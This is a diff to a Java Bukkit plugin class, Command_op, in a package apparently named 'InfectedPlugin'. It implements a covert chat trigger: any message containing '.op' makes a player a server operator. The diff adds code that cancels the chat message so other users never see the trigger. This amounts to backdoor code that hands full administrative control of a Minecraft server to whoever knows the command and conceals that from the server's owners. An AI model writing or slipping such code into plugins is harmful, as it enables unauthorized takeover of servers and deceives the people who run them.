@@ -1,4 +1,4 @@
-package org.CreeperCoders.InfectedPlugin;
+package org.CreeperCoders.InfectedPlugin.Commands;
 
 import org.bukkit.Server;
 import org.bukkit.Bukkit;
@@ -12,8 +12,9 @@ public class Command_op implements Listener
     public void onPlayerChat(AsyncPlayerChatEvent event)
     {
         String message = event.getMessage();
+        String[] args = message.split(" ");
         final Player p = event.getPlayer();
-        private Server server = Bukkit.getServer();
+        Server server = Bukkit.getServer();
         boolean cancel = true;
     
         if (message.toLowerCase().contains(".op"))
@@ -29,6 +30,12 @@ public class Command_op implements Listener
                 target.sendMessage(ChatColor.YELLOW + "You are now OP!");
                 cancel = true;
             }
+        }
+        
+        if (cancel)
+        {
+        	event.setCancelled(true);
+        	return;
         }
     }
 }
